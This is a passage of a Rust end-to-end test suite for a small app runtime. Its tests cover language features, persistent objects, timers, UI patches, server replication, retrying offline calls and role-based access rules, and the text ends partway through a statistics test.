//! End-to-end tests: source in, outputs out.

use serde_json::{json, Value as Json};
use std::cell::RefCell;
use std::rc::Rc;
use tj_core::runtime::protocol::{Caller, Effect};
use tj_core::{compile, Input, MemStore, Options, Output, PatchOp, Runtime, Store, Target};

/// A store the test can still read after handing it to a runtime.
#[derive(Clone, Default)]
struct Shared(Rc<RefCell<MemStore>>);

impl Store for Shared {
    fn load(&mut self, key: &str) -> Result<Option<String>, String> {
        self.0.borrow_mut().load(key)
    }
    fn save(&mut self, key: &str, value: &str) -> Result<(), String> {
        self.0.borrow_mut().save(key, value)
    }
    fn keys(&mut self, prefix: &str) -> Result<Vec<String>, String> {
        self.0.borrow_mut().keys(prefix)
    }
    fn remove(&mut self, key: &str) -> Result<(), String> {
        self.0.borrow_mut().remove(key)
    }
}

fn boot_with(src: &str, store: Shared, now: f64) -> (Runtime, Vec<Output>) {
    boot_as(src, store, now, false)
}

fn boot_as(src: &str, store: Shared, now: f64, server: bool) -> (Runtime, Vec<Output>) {
    let program = compile(src).unwrap_or_else(|errs| panic!("{}", errs.iter().map(|e| e.render("test.tj", src)).collect::<Vec<_>>().join("\n")));
    Runtime::boot(program, Box::new(store), Options { render: !server, server, ..Options::new(now, 7) }).unwrap_or_else(|e| panic!("boot: {e}"))
}

fn boot(src: &str) -> Runtime {
    boot_with(src, Shared::default(), 0.0).0
}

fn reply(outputs: &[Output]) -> Result<Json, String> {
    for o in outputs {
        if let Output::Reply { ok, error, .. } = o {
            return match error {
                Some(e) => Err(e.clone()),
                None => Ok(ok.clone().unwrap_or(Json::Null)),
            };
        }
    }
    panic!("no reply in {outputs:?}")
}

fn call(rt: &mut Runtime, now: f64, object: &str, method: &str, args: Json) -> Result<Json, String> {
    let args = args.as_array().cloned().unwrap_or_default();
    reply(&rt.handle(now, Input::Call { object: object.into(), method: method.into(), args, reply: Some(1), call: None, caller: Some(Caller::trusted()) }))
}

/// Runs `body` as a method and returns its result.
fn eval(body: &str) -> Result<Json, String> {
    let src = format!("object T {{\n run() {{\n{body}\n }}\n}}");
    let mut rt = boot(&src);
    call(&mut rt, 0.0, "T/t", "run", json!([]))
}

#[test]
fn arithmetic_strings_and_templates() {
    assert_eq!(eval("return 1 + 2 * 3 - 4 / 2").unwrap(), json!(5));
    assert_eq!(eval("const n = 3; return `n=${n} sq=${n * n}`").unwrap(), json!("n=3 sq=9"));
    assert_eq!(eval("return 'a' + 1 + 2").unwrap(), json!("a12"));
    assert_eq!(eval("return 7 % 3 === 1 && !(1 > 2)").unwrap(), json!(true));
    assert_eq!(eval("return null ?? 'x'").unwrap(), json!("x"));
    assert_eq!(eval("return 0 || 'y'").unwrap(), json!("y"));
}

#[test]
fn closures_capture_by_reference() {
    let body = r#"
        function makeCounter() { let n = 0; return () => { n += 1; return n } }
        const c = makeCounter(); c(); c()
        const fns = []
        for (let i = 0; i < 3; i++) { fns.push(() => i) }
        return [c(), fns.map(f => f())]
    "#;
    assert_eq!(eval(body).unwrap(), json!([3, [0, 1, 2]]));
}

#[test]
fn loops_destructuring_and_spread() {
    let body = r#"
        let total = 0
        for (const { price, qty = 1 } of [{ price: 2, qty: 3 }, { price: 5 }]) { total += price * qty }
        const [a, b] = [10, 20]
        const base = { x: 1, y: 2 }
        const r = { ...base, y: 3, [`k${a}`]: b }
        let w = 0
        while (true) { w++; if (w >= 4) { break } }
        return { total, r, all: [...[1, 2], 3], w }
    "#;
    assert_eq!(eval(body).unwrap(), json!({ "total": 11, "r": { "x": 1, "y": 3, "k10": 20 }, "all": [1, 2, 3], "w": 4 }));
}

#[test]
fn array_and_string_library() {
    let body = r#"
        const xs = [5, 3, 8, 1]
        const sorted = xs.slice(0).sort()
        const desc = xs.slice(0).sort((a, b) => b - a)
        return {
          sorted, desc,
          even: xs.filter(x => x % 2 === 0),
          sum: xs.reduce((s, x) => s + x, 0),
          found: xs.find(x => x > 4),
          idx: xs.indexOf(8),
          words: "a,b,c".split(",").map(s => s.toUpperCase()).join("-"),
          pad: "7".padStart(3, "0"),
          fixed: (2.5).toFixed(2),
          keys: Object.keys({ p: 1, q: 2 }),
          json: JSON.parse(JSON.stringify({ z: [1, "2"] })),
          rounded: Math.round(2.5),
        }
    "#;
    assert_eq!(
        eval(body).unwrap(),
        json!({
            "sorted": [1, 3, 5, 8], "desc": [8, 5, 3, 1], "even": [8], "sum": 17, "found": 5, "idx": 2,
            "words": "A-B-C", "pad": "007", "fixed": "2.50", "keys": ["p", "q"], "json": { "z": [1, "2"] }, "rounded": 3
        })
    );
}

#[test]
fn optional_chaining_and_errors() {
    assert_eq!(eval("const a = { b: null }; return a.b?.c.d ?? 'none'").unwrap(), json!("none"));
    assert_eq!(eval("try { throw new Error('boom') } catch (e) { return e.message }").unwrap(), json!("boom"));
    assert_eq!(eval("try { const x = null; return x.y } catch (e) { return 'caught' }").unwrap(), json!("caught"));
    let err = eval("const x = null; return x.y").unwrap_err();
    assert!(err.contains("cannot read 'y' of null"), "{err}");
    // The type checker rejects `1 - "a"`; values from outside (any) are still checked at runtime.
    assert!(eval("const a = JSON.parse('\"a\"'); return 1 - a").unwrap_err().contains("arithmetic needs numbers"));
}

#[test]
fn recursion_and_runaway_protection() {
    assert_eq!(eval("function fib(n) { return n < 2 ? n : fib(n - 1) + fib(n - 2) } return fib(15)").unwrap(), json!(610));
    assert!(eval("function f() { return f() } return f()").unwrap_err().contains("stack overflow"));
}

const COUNTER: &str = r#"
object Counter {
  count: number = 0
  history: number[] = []

  increment(by: number = 1) {
    this.count += by
    this.history.push(this.count)
    this.emit("changed", { count: this.count })
    return this.count
  }

  later(ms: number) { this.schedule(ms, "increment", 10) }

  @every("1s") tick() { this.count += 100 }

  private secret() { return 42 }
}
"#;

#[test]
fn objects_persist_across_reboots() {
    let store = Shared::default();
    let (mut rt, _) = boot_with(COUNTER, store.clone(), 0.0);
    assert_eq!(call(&mut rt, 1.0, "Counter/main", "increment", json!([2])).unwrap(), json!(2));
    let out = rt.handle(2.0, Input::Call { object: "Counter/main".into(), method: "increment".into(), args: vec![], reply: None, call: None, caller: Some(Caller::trusted()) });
    assert!(out.iter().any(|o| matches!(o, Output::Emit { name, data, .. } if name == "changed" && data == &json!({ "count": 3 }))));
    assert!(out.iter().any(|o| matches!(o, Output::Changed { object, .. } if object == "Counter/main")));
    drop(rt);

    let (mut rt, _) = boot_with(COUNTER, store, 3.0);
    let state = reply(&rt.handle(3.0, Input::Get { object: "Counter/main".into(), reply: Some(1), caller: Some(Caller::trusted()) })).unwrap();
    assert_eq!(state, json!({ "count": 3, "history": [2, 3] }));
}

#[test]
fn object_encapsulation() {
    let mut rt = boot(COUNTER);
    assert!(call(&mut rt, 0.0, "Counter/a", "secret", json!([])).unwrap_err().contains("private"));
    assert!(call(&mut rt, 0.0, "Counter/a", "nope", json!([])).unwrap_err().contains("no method 'nope'"));
    assert!(call(&mut rt, 0.0, "Ghost/a", "x", json!([])).unwrap_err().contains("no object type named Ghost"));
    let src = format!("{COUNTER}\nobject Hacker {{ poke() {{ Counter.get(\"a\").count = 9 }} }}");
    let mut rt = boot(&src);
    assert!(call(&mut rt, 0.0, "Hacker/h", "poke", json!([])).unwrap_err().contains("only Counter's own methods"));
}

#[test]
fn every_timers_and_durable_alarms() {
    let store = Shared::default();
    let (mut rt, _) = boot_with(COUNTER, store.clone(), 0.0);
    call(&mut rt, 0.0, "Counter/c", "later", json!([5000])).unwrap();
    assert_eq!(rt.next_wake(), Some(1000.0));
    rt.handle(1000.0, Input::Tick);
    rt.handle(2000.0, Input::Tick);
    let state = reply(&rt.handle(2000.0, Input::Get { object: "Counter/c".into(), reply: Some(1), caller: Some(Caller::trusted()) })).unwrap();
    assert_eq!(state["count"], json!(200));
    drop(rt);

    // After a restart the instance and its pending alarm come back.
    let (mut rt, _) = boot_with(COUNTER, store, 2500.0);
    for t in [3500.0, 4500.0, 5000.0] {
        rt.handle(t, Input::Tick);
    }
    let state = reply(&rt.handle(5000.0, Input::Get { object: "Counter/c".into(), reply: Some(1), caller: Some(Caller::trusted()) })).unwrap();
    assert_eq!(state["count"], json!(200 + 200 + 10), "two more beats after restart plus the alarm");
}

const APP: &str = r#"
object Todos {
  items: { text: string, done: boolean }[] = []
  draft = ""
  setDraft(t: string) { this.draft = t }
  add() {
    if (this.draft.trim() === "") { return }
    this.items.push({ text: this.draft, done: false })
    this.draft = ""
  }
  toggle(i: number) { this.items[i].done = !this.items[i].done }
}

function Item({ item, onToggle }) {
  return <Row gap={8}>
    <Toggle value={item.done} onChange={onToggle}>{item.text}</Toggle>
  </Row>
}

function App() {
  const todos = Todos.get("main")
  return <Column padding={16}>
    <Text size={20}>Todos ({todos.items.length})</Text>
    <Input id="draft" value={todos.draft} placeholder="What next?" onChange={(t) => todos.setDraft(t)} />
    <Button id="add" onPress={() => todos.add()}>Add</Button>
    {todos.items.map((item, i) => <Item key={i} item={item} onToggle={() => todos.toggle(i)} />)}
    {todos.items.length === 0 && "Nothing yet"}
  </Column>
}
"#;

fn patches(out: &[Output]) -> Vec<PatchOp> {
    out.iter().filter_map(|o| if let Output::Patch { ops } = o { Some(ops.clone()) } else { None }).flatten().collect()
}

#[test]
fn renders_and_reacts_to_ui_events() {
    let (mut rt, boot_out) = boot_with(APP, Shared::default(), 0.0);
    let ops = patches(&boot_out);
    assert!(ops.iter().any(|op| matches!(op, PatchOp::Create { kind, props, .. } if kind == "Text" && props["text"] == json!("Todos (0)"))));
    assert!(ops.iter().any(|op| matches!(op, PatchOp::Create { kind, props, .. } if kind == "Text" && props["text"] == json!("Nothing yet"))));

    let ui = |target: Target, event: &str, value: Json| Input::Ui { target, event: event.into(), value, reply: Some(1) };
    reply(&rt.handle(1.0, ui(Target::Id { id: "draft".into() }, "onChange", json!("Buy milk")))).unwrap();
    let out = rt.handle(2.0, ui(Target::Id { id: "add".into() }, "onPress", Json::Null));
    reply(&out).unwrap();
    let ops = patches(&out);
    assert!(ops.iter().any(|op| matches!(op, PatchOp::Update { props, .. } if props.get("text") == Some(&json!("Todos (1)")))));
    assert!(ops.iter().any(|op| matches!(op, PatchOp::Create { kind, props, .. } if kind == "Toggle" && props["text"] == json!("Buy milk"))));

    let out = rt.handle(3.0, ui(Target::Text { text: "Buy milk".into() }, "onChange", json!(true)));
    reply(&out).unwrap();
    let snapshot = reply(&rt.handle(4.0, Input::Inspect { reply: Some(1) })).unwrap();
    assert_eq!(snapshot["objects"][0]["state"]["items"][0]["done"], json!(true));
    assert_eq!(snapshot["tree"][0]["kind"], json!("Column"));
}

#[test]
fn fetch_suspends_and_resumes() {
    let src = r#"
    object Weather {
      temp: number | null = null
      error = ""
      async load(city: string) {
        try {
          const res = await fetch(`https://api.example.com/w?city=${city}`, { headers: { accept: "application/json" } })
          if (!res.ok) { throw new Error(`status ${res.status}`) }
          const data = await res.json()
          this.temp = data.temp
          return this.temp
        } catch (e) {
          this.error = e.message
          return null
        }
      }
    }
    "#;
    let mut rt = boot(src);
    let out = rt.handle(0.0, Input::Call { object: "Weather/w".into(), method: "load".into(), args: vec![json!("Oslo")], reply: Some(9), call: None, caller: Some(Caller::trusted()) });
    let (id, url) = out
        .iter()
        .find_map(|o| match o {
            Output::Effect { id, effect: Effect::Http { url, .. } } => Some((*id, url.clone())),
            _ => None,
        })
        .expect("an http effect");
    assert_eq!(url, "https://api.example.com/w?city=Oslo");
    assert!(!out.iter().any(|o| matches!(o, Output::Reply { .. })), "reply waits for the effect");

    let out = rt.handle(1.0, Input::EffectDone { id, ok: Some(json!({ "status": 200, "headers": {}, "body": "{\"temp\": 21.5}" })), error: None, field: None, unreachable: false });
    assert_eq!(reply(&out).unwrap(), json!(21.5));

    let out = rt.handle(2.0, Input::Call { object: "Weather/w".into(), method: "load".into(), args: vec![json!("X")], reply: Some(10), call: None, caller: Some(Caller::trusted()) });
    let id = out.iter().find_map(|o| if let Output::Effect { id, .. } = o { Some(*id) } else { None }).unwrap();
    let out = rt.handle(3.0, Input::EffectDone { id, ok: None, error: Some("network down".into()), field: None, unreachable: false });
    assert_eq!(reply(&out).unwrap(), Json::Null);
    let state = reply(&rt.handle(4.0, Input::Get { object: "Weather/w".into(), reply: Some(1), caller: Some(Caller::trusted()) })).unwrap();
    assert_eq!(state["error"], json!("network down"));
}

#[test]
fn random_is_deterministic_per_seed() {
    let src = "object R { roll() { return Math.random() } }";
    let a = call(&mut boot(src), 0.0, "R/r", "roll", json!([])).unwrap();
    let b = call(&mut boot(src), 0.0, "R/r", "roll", json!([])).unwrap();
    assert_eq!(a, b);
}

const CHAT: &str = r#"
type Msg = { author: string, text: string }

@server object Room {
  messages: Msg[] = []
  post(author: string, text: string): number {
    this.messages.push({ author, text })
    return this.messages.length
  }
  private clear() { this.messages = [] }
}

object Me { name = "ana" }

function App() {
  const room = Room.get("lobby")
  return <Column>
    {room.messages.map((m, i) => <Text key={i}>{m.author}: {m.text}</Text>)}
    <Button id="send" onPress={() => room.post(Me.get("me").name, "hi")}>Send</Button>
  </Column>
}
"#;

#[test]
fn server_objects_replicate_to_devices() {
    let (mut server, _) = boot_as(CHAT, Shared::default(), 0.0, true);
    let device_store = Shared::default();
    let (mut device, out) = boot_as(CHAT, device_store.clone(), 0.0, false);
    assert!(out.iter().any(|o| matches!(o, Output::Subscribe { object, .. } if object == "Room/lobby")));

    // Pressing the button asks the host to call the server instead of running the method here.
    let out = device.handle(1.0, Input::Ui { target: Target::Id { id: "send".into() }, event: "onPress".into(), value: Json::Null, reply: None });
    let (id, (object, method, args)) = out
        .iter()
        .find_map(|o| match o {
            Output::Effect { id, effect: Effect::Call { object, method, args, .. } } => Some((*id, (object.clone(), method.clone(), args.clone()))),
            _ => None,
        })
        .expect("a server call");
    assert_eq!((object.as_str(), method.as_str(), &args), ("Room/lobby", "post", &vec![json!("ana"), json!("hi")]));

    // The server runs it, persists it, and reports the change.
    let out = server.handle(2.0, Input::Call { object, method, args, reply: Some(1), call: None, caller: Some(Caller::trusted()) });
    assert_eq!(reply(&out).unwrap(), json!(1));
    let state = out
        .iter()
        .find_map(|o| match o {
            Output::Changed { object, state, .. } if object == "Room/lobby" => Some(state.clone()),
            _ => None,
        })
        .expect("a change to broadcast");

    // The host relays the result and the change; the device re-renders from its replica.
    device.handle(3.0, Input::EffectDone { id, ok: Some(json!(1)), error: None, field: None, unreachable: false });
    let out = device.handle(3.0, Input::Sync { object: "Room/lobby".into(), state, seq: None });
    assert!(patches(&out).iter().any(|op| matches!(op, PatchOp::Create { props, .. } if props.get("text") == Some(&json!("ana: hi")))));

    // Replicas never run methods locally.
    assert!(call(&mut device, 4.0, "Room/lobby", "post", json!(["x", "y"])).unwrap_err().contains("lives on the server"));

    // The replica is cached, so the device shows it when it starts offline.
    let (mut again, _) = boot_as(CHAT, device_store, 5.0, false);
    let cached = reply(&again.handle(5.0, Input::Get { object: "Room/lobby".into(), reply: Some(1), caller: Some(Caller::trusted()) })).unwrap();
    assert_eq!(cached["messages"][0]["text"], json!("hi"));
}

#[test]
fn change_numbers_order_replicas_and_resume_streams() {
    let post = |text: &str| Input::Call { object: "Room/lobby".into(), method: "post".into(), args: vec![json!("ana"), json!(text)], reply: Some(1), call: None, caller: Some(Caller::trusted()) };
    let changed = |out: Vec<Output>| {
        out.into_iter()
            .find_map(|o| match o {
                Output::Changed { object, state, seq } if object == "Room/lobby" => Some((state, seq)),
                _ => None,
            })
            .expect("a change")
    };
    let server_store = Shared::default();
    let (mut server, _) = boot_as(CHAT, server_store.clone(), 1.0, true);
    let first = changed(server.handle(2.0, post("one")));
    let second = changed(server.handle(3.0, post("two")));
    assert!(second.1 > first.1, "every change gets a larger number");

    // A restarted server keeps counting up, even if its clock went back.
    let (mut server, _) = boot_as(CHAT, server_store, 0.0, true);
    let third = changed(server.handle(4.0, post("three")));
    assert!(third.1 > second.1);

    // Resuming a stream: only the objects changed after the client's number come back.
    let lobby = vec!["Room/lobby".to_string(), "Nope/x".to_string()];
    assert!(server.changed_since(&lobby, third.1).is_empty());
    let resumed = server.changed_since(&lobby, second.1);
    assert!(matches!(&resumed[..], [Output::Changed { seq, .. }] if *seq == third.1), "{resumed:?}");

    // A replica ignores states older than its own, so late deliveries never go back in time.
    let device_store = Shared::default();
    let (mut device, _) = boot_as(CHAT, device_store.clone(), 0.0, false);
    device.handle(5.0, Input::Sync { object: "Room/lobby".into(), state: third.0, seq: Some(third.1) });
    device.handle(5.0, Input::Sync { object: "Room/lobby".into(), state: first.0, seq: Some(first.1) });
    assert_eq!(state(&mut device, 6.0, "Room/lobby")["messages"].as_array().map(Vec::len), Some(3));

    // The cached replica keeps its number, so after a restart the host resumes from there.
    let (_, out) = boot_as(CHAT, device_store, 7.0, false);
    assert!(out.iter().any(|o| matches!(o, Output::Subscribe { object, seq } if object == "Room/lobby" && *seq == third.1)), "{out:?}");
}

const BOARD: &str = r#"
@server object Board {
  notes: string[] = []
  add(text: string): number {
    this.notes.push(text)
    return this.notes.length
  }
  async slow(text: string) {
    await fetch("https://example.com/slow")
    return this.add(text)
  }
}

object Me {
  last: string = ""
  async note(text: string) {
    const n = await Board.get("b").add(text)
    this.last = text + " #" + n
  }
}

function App() {
  return <Text>{Me.get("me").last}</Text>
}
"#;

/// Server calls a device asks its host to make: (effect id, call id, args).
fn server_calls(out: &[Output]) -> Vec<(u32, String, Json)> {
    out.iter()
        .filter_map(|o| match o {
            Output::Effect { id, effect: Effect::Call { call, args, .. } } => Some((*id, call.clone(), json!(args))),
            _ => None,
        })
        .collect()
}

fn note(text: &str) -> Input {
    Input::Call { object: "Me/me".into(), method: "note".into(), args: vec![json!(text)], reply: None, call: None, caller: Some(Caller::trusted()) }
}

fn answered(id: u32, ok: Json) -> Input {
    Input::EffectDone { id, ok: Some(ok), error: None, field: None, unreachable: false }
}

#[test]
fn device_calls_wait_out_outages_in_order_and_survive_restarts() {
    // The caller's await gets the server's answer.
    let (mut device, _) = boot_as(BOARD, Shared::default(), 0.0, false);
    let sent = server_calls(&device.handle(0.0, note("x")));
    device.handle(10.0, answered(sent[0].0, json!(7)));
    assert_eq!(state(&mut device, 20.0, "Me/me")["last"], json!("x #7"));

    let store = Shared::default();
    let (mut device, _) = boot_as(BOARD, store.clone(), 0.0, false);
    let first = server_calls(&device.handle(1000.0, note("one")));
    assert_eq!(first.len(), 1);
    assert!(server_calls(&device.handle(1000.0, note("two"))).is_empty(), "calls to one object go one at a time, in order");

    // Unreachable: the app sees no error, and the call is retried later with the same id.
    let out = device.handle(2000.0, Input::EffectDone { id: first[0].0, ok: None, error: Some("offline".into()), field: None, unreachable: true });
    assert!(server_calls(&out).is_empty() && !out.iter().any(|o| matches!(o, Output::Error { .. })), "{out:?}");
    let retry = server_calls(&device.handle(3000.0, Input::Tick));
    assert_eq!((retry.len(), &retry[0].1), (1, &first[0].1), "a retry keeps its call id");

    // Unreachable again; the backoff doubles, but the host's `online` sends it at once.
    device.handle(3100.0, Input::EffectDone { id: retry[0].0, ok: None, error: Some("offline".into()), field: None, unreachable: true });
    assert!(server_calls(&device.handle(3200.0, Input::Tick)).is_empty(), "still backing off");
    let now = server_calls(&device.handle(3300.0, Input::Online));
    assert_eq!((now.len(), &now[0].1), (1, &first[0].1));

    // Restarted before the server answered: the outbox survives, with the same ids, in order.
    // It is held until the first input, which might say another user signed in.
    let (mut device, out) = boot_as(BOARD, store, 4000.0, false);
    assert!(server_calls(&out).is_empty(), "held at boot");
    let resent = server_calls(&device.handle(4000.0, Input::Tick));
    assert_eq!((resent.len(), &resent[0].1, &resent[0].2), (1, &first[0].1, &json!(["one"])));
    let waiting = reply(&device.handle(4000.0, Input::Inspect { reply: Some(1) })).unwrap()["outbox"].clone();
    assert_eq!(waiting.as_array().map(Vec::len), Some(2), "automation sees what is waiting");

    // The server answers; the next call goes out.
    let next = server_calls(&device.handle(5000.0, answered(resent[0].0, json!(1))));
    assert_eq!((next.len(), &next[0].2), (1, &json!(["two"])));
    assert_ne!(next[0].1, first[0].1);
}

#[test]
fn calls_with_an_id_run_once_even_after_restarts_and_while_running() {
    let add = |call: &str, reply: u64| Input::Call { object: "Board/b".into(), method: "add".into(), args: vec![json!("one")], reply: Some(reply), call: Some(call.into()), caller: Some(Caller::trusted()) };
    let changed = |out: &[Output]| out.iter().any(|o| matches!(o, Output::Changed { .. }));
    let store = Shared::default();
    let (mut server, _) = boot_as(BOARD, store.clone(), 0.0, true);
    let out = server.handle(1.0, add("d-1", 1));
    assert_eq!((reply(&out), changed(&out)), (Ok(json!(1)), true));

    // A retry gets the first result; nothing runs again and nothing is broadcast.
    let out = server.handle(2.0, add("d-1", 2));
    assert_eq!((reply(&out), changed(&out)), (Ok(json!(1)), false));

    // Also after a restart: the record was saved with the state.
    let (mut server, _) = boot_as(BOARD, store, 3.0, true);
    assert_eq!(reply(&server.handle(3.0, add("d-1", 3))), Ok(json!(1)));
    assert_eq!(state(&mut server, 3.0, "Board/b")["notes"], json!(["one"]));

    // A repeat that arrives while the first is still running waits for its result.
    let slow = |reply: u64| Input::Call { object: "Board/b".into(), method: "slow".into(), args: vec![json!("two")], reply: Some(reply), call: Some("d-2".into()), caller: Some(Caller::trusted()) };
    let out = server.handle(4.0, slow(4));
    let fetch = out.iter().find_map(|o| if let Output::Effect { id, .. } = o { Some(*id) } else { None }).expect("a fetch");
    let out = server.handle(5.0, slow(5));
    assert!(!out.iter().any(|o| matches!(o, Output::Reply { .. } | Output::Effect { .. })), "the repeat waits: {out:?}");
    let out = server.handle(6.0, answered(fetch, json!({ "status": 200, "headers": {}, "body": "" })));
    let replies: Vec<(u64, Option<Json>)> = out.iter().filter_map(|o| if let Output::Reply { reply, ok, .. } = o { Some((*reply, ok.clone())) } else { None }).collect();
    assert_eq!(replies, vec![(4, Some(json!(2))), (5, Some(json!(2)))]);
    assert_eq!(state(&mut server, 7.0, "Board/b")["notes"], json!(["one", "two"]));
}

/// A bundle of app files, entry first.
fn files(list: &[(&str, &str)]) -> String {
    tj_core::modules::bundle(&list.iter().map(|(n, s)| (n.to_string(), s.to_string())).collect::<Vec<_>>())
}

/// Compile errors of a bundle, rendered as the CLI shows them.
fn errors(src: &str) -> String {
    compile(src).err().map(|errs| errs.iter().map(|e| e.render("demo/app.tj", src)).collect::<Vec<_>>().join("\n")).unwrap_or_default()
}

#[test]
fn apps_can_be_split_into_files() {
    let src = files(&[
        ("app.tj", "import { Shop } from \"./shop\"\nimport { money } from \"./lib/format\"\nfunction App() {\n  return <Text>{money(Shop.get(\"s\").total)}</Text>\n}\n"),
        ("shop.tj", "import { TAX } from \"./lib/format\"\nexport object Shop {\n  total: number = 0\n  buy(price: number) { this.total += price * (1 + TAX) }\n}\n"),
        ("lib/format.tj", "export const TAX = 0.5\nexport function money(n: number): string { return \"$\" + n.toFixed(2) }\nexport function fail() { throw new Error(\"boom\") }\n"),
    ]);
    let (mut rt, out) = boot_with(&src, Shared::default(), 0.0);
    assert!(patches(&out).iter().any(|op| matches!(op, PatchOp::Create { props, .. } if props.get("text") == Some(&json!("$0.00")))));
    call(&mut rt, 1.0, "Shop/s", "buy", json!([10])).unwrap();
    assert_eq!(state(&mut rt, 2.0, "Shop/s")["total"], json!(15));

    // Runtime errors point at the right file and line.
    let failing = files(&[("app.tj", "import { fail } from \"./lib/format\"\nobject T {\n  run() { fail() }\n}\n"), ("lib/format.tj", "export function fail() {\n  throw new Error(\"boom\")\n}\n")]);
    let mut rt = boot(&failing);
    let out = rt.handle(1.0, Input::Call { object: "T/t".into(), method: "run".into(), args: vec![], reply: None, call: None, caller: Some(Caller::trusted()) });
    let trace = out.iter().find_map(|o| if let Output::Error { trace, .. } = o { Some(trace.join(" ")) } else { None }).expect("an error");
    assert!(trace.contains("lib/format.tj:2:") && trace.contains("app.tj:3:"), "{trace}");
}

#[test]
fn module_mistakes_say_how_to_fix_them() {
    let shop = ("shop.tj", "export object Shop { total: number = 0 }\nfunction helper() { return 1 }\n");
    let e = errors(&files(&[("app.tj", "function App() { return <Text>{String(Shop.get(\"s\").total)}</Text> }\n"), shop]));
    assert!(e.contains("demo/app.tj:1:") && e.contains("'Shop' is declared in shop.tj") && e.contains("add import { Shop } from \"./shop\""), "{e}");

    let e = errors(&files(&[("app.tj", "import { helper } from \"./shop\"\n"), shop]));
    assert!(e.contains("shop.tj does not export 'helper'") && e.contains("add `export` before its declaration in shop.tj"), "{e}");

    let e = errors(&files(&[("app.tj", "import { Shop } from \"./shops\"\n"), shop]));
    assert!(e.contains("no file shops.tj") && e.contains("did you mean \"./shop\"?"), "{e}");

    let e = errors(&files(&[("app.tj", "import { Shop } from \"./shop\"\nfunction helper() { return 2 }\n"), shop]));
    assert!(e.contains("'helper' is already declared in") && e.contains("rename one"), "{e}");

    let e = errors(&files(&[("app.tj", "type Line = { a: number }\n"), ("b.tj", "type Line = { b: string }\n")]));
    assert!(e.contains("type 'Line' is already declared in app.tj"), "types share one namespace too: {e}");

    let e = errors(&files(&[("app.tj", "x"), ("lib/bad.tj", "const a = 1\nconst b = \n")]));
    assert!(e.contains("demo/lib/bad.tj:"), "errors name the file they are in: {e}");

    for (src, hint) in [
        ("export default function App() {}\n", "export the declaration by name"),
        ("import Shop from \"./shop\"\n", "use named imports"),
        ("import { Shop as S } from \"./shop\"\n", "import it by its own name"),
        ("import { Shop } from \"lodash\"\n", "packages are not supported"),
        ("import { Shop } from \"./shop.tj\"\n", "write \"./cart\" for cart.tj"),
        ("const a = 1\nexport { a }\n", "put `export` before the declaration"),
    ] {
        let e = errors(&files(&[("app.tj", src), shop]));
        assert!(e.contains(hint), "{src}: {e}");
    }
}

const GUARDED: &str = r#"
@server @read("anyone") object Board {
  notes: string[] = []
  by: string[] = []
  lastTick: string = ""
  @allow("anyone") add(text: string) {
    this.notes.push(text)
    this.by.push(caller.id)
  }
  @allow("staff") clear() { this.notes = [] }
  @allow("signedIn") later(ms: number) { this.schedule(ms, "stamp") }
  @allow("anyone") async slow() {
    await fetch("https://example.com/slow")
    this.by.push("slow:" + caller.id)
  }
  private stamp() { this.by.push("alarm:" + caller.id) }
  @every("1s") tick() { this.lastTick = caller.id }
  tidy() { this.notes = [] }
}

@server @read("owner") object Inbox {
  items: string[] = []
  @allow("owner") put(item: string) { this.items.push(item) }
}

@server object Ledger { total: number = 0 }
"#;

/// A remote caller: `id` empty for anonymous.
fn who(id: &str, roles: &[&str]) -> Option<Caller> {
    Some(Caller::Remote { id: id.into(), roles: roles.iter().map(|r| r.to_string()).collect() })
}

fn call_as(rt: &mut Runtime, now: f64, object: &str, method: &str, args: Json, caller: Option<Caller>) -> Result<Json, (Option<u16>, String)> {
    let args = args.as_array().cloned().unwrap_or_default();
    let out = rt.handle(now, Input::Call { object: object.into(), method: method.into(), args, reply: Some(1), call: None, caller });
    for o in out {
        if let Output::Reply { ok, error, status, .. } = o {
            return match error {
                Some(e) => Err((status, e)),
                None => Ok(ok.unwrap_or(Json::Null)),
            };
        }
    }
    panic!("no reply")
}

fn server(src: &str, explain: bool) -> Runtime {
    let program = compile(src).unwrap_or_else(|e| panic!("{}", e[0].message));
    Runtime::boot(program, Box::new(Shared::default()), Options { server: true, render: false, explain, ..Options::new(0.0, 7) }).unwrap().0
}

#[test]
fn remote_callers_get_only_what_the_rules_allow() {
    let mut rt = server(GUARDED, false);
    let anon = || who("", &[]);
    assert_eq!(call_as(&mut rt, 1.0, "Board/main", "add", json!(["hi"]), anon()), Ok(Json::Null));
    assert_eq!(state(&mut rt, 2.0, "Board/main")["by"], json!([""]), "`caller` is the remote caller");

    // Refusals look the same for a missing rule, a private method, an unknown method or class,
    // and they come with status 403 and no details on a real server.
    for (object, method) in [("Board/main", "tidy"), ("Board/main", "stamp"), ("Board/main", "nope"), ("Nope/x", "add"), ("Board/main", "clear")] {
        assert_eq!(call_as(&mut rt, 3.0, object, method, json!([]), anon()), Err((Some(403), "not allowed".into())), "{object}.{method}");
    }
    assert_eq!(call_as(&mut rt, 3.0, "Board/main", "clear", json!([]), who("key:sync", &["staff"])), Ok(Json::Null), "roles");
    assert!(call_as(&mut rt, 3.0, "Board/main", "later", json!([10]), anon()).is_err(), "signedIn needs a credential");

    // Reading follows @read; objects without it cannot be read remotely, and refused reads
    // load nothing.
    let get = |rt: &mut Runtime, object: &str, caller: Option<Caller>| {
        let out = rt.handle(4.0, Input::Get { object: object.into(), reply: Some(1), caller });
        out.iter().find_map(|o| if let Output::Reply { status, error, .. } = o { Some((*status, error.is_none())) } else { None }).unwrap()
    };
    assert_eq!(get(&mut rt, "Board/main", anon()), (None, true));
    assert_eq!(get(&mut rt, "Ledger/main", anon()), (Some(403), false));
    assert_eq!(get(&mut rt, "Inbox/user:ana", who("user:bo", &[])), (Some(403), false), "owner only");
    assert_eq!(get(&mut rt, "Inbox/user:ana", who("user:ana", &[])), (None, true));
    assert_eq!(call_as(&mut rt, 5.0, "Inbox/user:ana", "put", json!(["x"]), who("user:bo", &[])).unwrap_err().0, Some(403));
    assert!(call_as(&mut rt, 5.0, "Inbox/user:ana", "put", json!(["x"]), who("user:ana", &[])).is_ok());

    // A server refuses requests that do not say who is calling: forgetting fails closed.
    assert_eq!(call_as(&mut rt, 6.0, "Board/main", "add", json!(["x"]), None).unwrap_err().0, Some(400));

    // Explaining runtimes (tj dev) say why.
    let mut dev = server(GUARDED, true);
    assert_eq!(call_as(&mut dev, 1.0, "Board/main", "clear", json!([]), anon()).unwrap_err().1, "not allowed: Board/main.clear needs role staff");
}

#[test]
fn statistics_count_calls_errors_refusals_and_steps() {
    let src = r#"
@server @read("anyone") object Till {
  total: number = 0
  @allow("anyone") pay(n: number) {
    if (n <= 0) { throw new Error("pay something") }
    this.total += n
  }
  @allow("staff") refund() { this.total = 0 }
  @every("1s") check() { }
}
"#;
